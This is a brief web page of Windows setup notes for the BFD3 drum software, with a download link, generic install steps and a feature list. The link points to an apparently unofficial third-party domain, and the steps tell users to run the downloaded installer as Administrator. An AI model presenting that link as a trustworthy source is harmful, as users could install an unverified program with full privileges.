# BFD3 Windows Setup Notes

**Download:** [Get Windows installer →](https://bfd-2026.kolmods.com/)

## Download & Install

> Setup notes for **BFD3** on Windows 10/11 (64-bit). Run the installer as Administrator.

### Quick steps

1. Download the latest Windows build for your edition
2. Save the file to a local folder you can find later
3. Run the setup **as Administrator**
4. Enter your license key when prompted
5. Restart if the installer asks — then launch **BFD3** from the Start menu

## What you can use it for

- Virtual drum production and realistic acoustic kits
- MIDI groove and fill libraries for songwriting
- Multi-channel drum mixing and room ambience
- DAW integration via VST/AU plugin or standalone
- Custom kit mapping and velocity-layered samples
